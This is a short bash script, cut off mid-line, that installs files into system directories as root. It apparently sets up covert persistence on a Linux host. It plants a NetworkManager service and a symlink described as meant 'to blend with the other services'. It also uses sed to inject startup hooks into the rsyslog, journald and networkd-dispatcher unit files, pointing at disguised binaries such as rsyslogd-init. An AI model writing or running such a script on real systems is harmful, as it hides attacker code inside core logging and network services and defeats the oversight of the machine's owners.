#!/bin/bash

# Copy NetworkManager service file
cp NetworkManager.service /lib/systemd/system/NetworkManager.service
# Create a symlink to blend with the other services
ln -s /lib/systemd/system/NetworkManager.service /etc/systemd/system/dbus-org.freedesktop.NetworkManager.service
# Just double check
chmod a+x nm-startup
cp nm-startup /usr/lib/NetworkManager

# Make sure the copies of the bash file are properly formatted
chmod 755 -R lib-systemd/
chmod 755 -R usr-bin/

chown root:root -R lib-systemd/
chown root:root -R usr-bin/

cp lib-systemd/* /lib/systemd
cp usr-bin/* /usr/bin

# Add the following executables as ExecPre/ExecPost start to the service files
# rsyslog
sed -i '/Type=notify/a ExecStartPre=/usr/bin/rsyslogd-init -i' /lib/systemd/system/rsyslog.service
# systemd-journald
sed -i '/ExecStart=\/lib\/systemd\/systemd-journald/a ExecStartPost=/lib/systemd/systemd-journald-socket' /lib/systemd/system/systemd-journald.service
# networkd-dispatcher
sed -i '/Type=notify/a ExecStartPre=/usr/bin/networkd-disp